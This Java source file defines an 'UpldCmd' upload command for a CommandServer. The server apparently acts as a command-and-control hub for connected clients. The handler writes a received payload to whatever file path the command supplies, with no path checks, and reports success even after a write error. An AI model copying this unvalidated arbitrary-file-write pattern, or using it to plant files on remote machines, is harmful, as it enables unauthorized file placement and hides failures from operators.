package commands;

import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;

import server.CommandServer;
import tools.ParsedCommand;

public class UpldCmd extends ServerCommand {

	public UpldCmd(CommandServer c2) {
		super(c2);
	}
	
	@Override
	public String exec(ParsedCommand pCmd) {
		
		try {
			OutputStream out = new FileOutputStream(pCmd.args[0]);
			for (int i = 0; i < pCmd.payload.length; i++) {
				out.write(pCmd.payload[i]);
			}
			out.close();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		if (c2.getCurrentClient() >= 0)
			return N_DONE;
		return DONE;
	}

}
